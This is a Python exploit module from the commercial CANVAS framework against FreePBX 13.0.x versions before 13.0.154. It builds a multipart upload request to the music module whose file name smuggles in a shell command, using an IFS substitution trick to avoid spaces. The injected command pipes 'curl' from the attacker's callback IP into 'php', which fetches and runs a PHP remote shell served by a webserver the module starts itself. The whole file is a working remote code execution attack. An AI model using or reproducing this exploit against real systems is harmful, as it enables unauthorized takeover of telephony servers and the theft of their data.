#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from ExploitTypes.phpexploit import *
import canvasengine
import socket
from libs.canvasos import *

import logging

NAME                            = "pbx_rce"
DESCRIPTION                     = "FreePBX 13.0.x < 13.0.154 Remote Command Injection"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "FreePBX"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["References"]     = ["https://packetstormsecurity.com/files/138620/FreePBX-13.0.x-Code-Execution.html"]

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Linux" ] ]
PROPERTY['VERSION']             = [ "13.0.x < 13.0.154" ]

NOTES                           = """
"""

CHANGELOG                       = """
"""

class theexploit(phpexploit):
    def __init__(self):
        phpexploit.__init__(self)
        self.port = 80
        self.host = ""
        self.ssl = ""
        self.name = NAME
        self.basepath = "/admin"
        self.basepaths = ["/admin"]
        self.command = None # none by default. We want to try to automatically load MOSDEF
        self.basicauth_user = ""
        self.basicauth_password = ""
        self.hostname = None
        self.verb = "POST"
        self.content_type = "multipart/form-data;boundary=---------------------------6276058042765472731423987419"
        self.targetpath = "/ajax.php?module=music&command=upload&category=default"
        self.foundstrings = ["PNG"]
        self.testfile = "/images/freepbx.png" # file to test for path with

    def getthepayload(self):
        referer = "http"
        if self.ssl:
            referer += "s"
        referer += "://" + self.ua.hostname + self.basepath + self.targetpath
        self.ua.addHeader("Referer", referer)
        packedIP = str(int(str(socket.inet_pton(socket.AF_INET, self.callback.ip)).encode('hex'), 16))
        payl = "curl " + packedIP + ":" +  str(self.webserverport) + " | php "
        payl = payl.replace(" ", "${a}")
        logging.info("Using payload: " + payl)
        return payl

    def set_up_webserver(self):
        """
        Creates a webserver that always returns our php callback shell
        as any file you request from it
        """
        self.webserverport = random.randint(10000, 11000)
        logging.info("Setting up download webserver on port " + str(self.webserverport))
        data = "<?php " + self.get_php_to_mosdef() + "?>"
        self.log(data)
        app = self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"] = self.webserverport
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["sourcedata"] = data
        ret = app.listen()
        self.server = app
        return ret

    def getbody(self):
        self.set_up_webserver()
        thebody = ""
        thebody += "-----------------------------6276058042765472731423987419\n"
        thebody += "Content-Disposition: form-data; name=\"id\"\n"
        thebody += "\n"
        thebody += "1\n"
        thebody += "-----------------------------6276058042765472731423987419\n"
        thebody += "Content-Disposition: form-data; name=\"action\"\n"
        thebody += "\n"
        thebody += "editold\n"
        thebody += "-----------------------------6276058042765472731423987419\n"
        thebody += "Content-Disposition: form-data; name=\"type\"\n"
        thebody += "\n"
        thebody += "files\n"
        thebody += "-----------------------------6276058042765472731423987419\n"
        thebody += "Content-Disposition: form-data; name=\"application\"\n"
        thebody += "\n"
        thebody += "\n"
        thebody += "-----------------------------6276058042765472731423987419\n"
        thebody += "Content-Disposition: form-data; name=\"format\"\n"
        thebody += "\n"
        thebody += "\n"
        thebody += "-----------------------------6276058042765472731423987419\n"
        thebody += "Content-Disposition: form-data; name=\"erand\"\n"
        thebody += "\n"
        thebody += "no\n"
        thebody += "-----------------------------6276058042765472731423987419\n"
        thebody += "Content-Disposition: form-data; name=\"codec[]\"\n"
        thebody += "\n"
        thebody += "gsm\n"
        thebody += "-----------------------------6276058042765472731423987419\n"
        thebody += "Content-Disposition: form-data; name=\"files[]\"; filename=\"$(a=ifs;a=${a^^};a=${!a};"
        thebody += self.getthepayload()
        thebody += ").wav\"\n"
        thebody += "Content-Type: audio/x-wav\n"
        thebody += "\n"
        thebody += "A\n"
        thebody += "-----------------------------6276058042765472731423987419--\n"
        return thebody

        def parse_command_response(self, data):
            """
            Give me the result of my command
            """
            return data


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
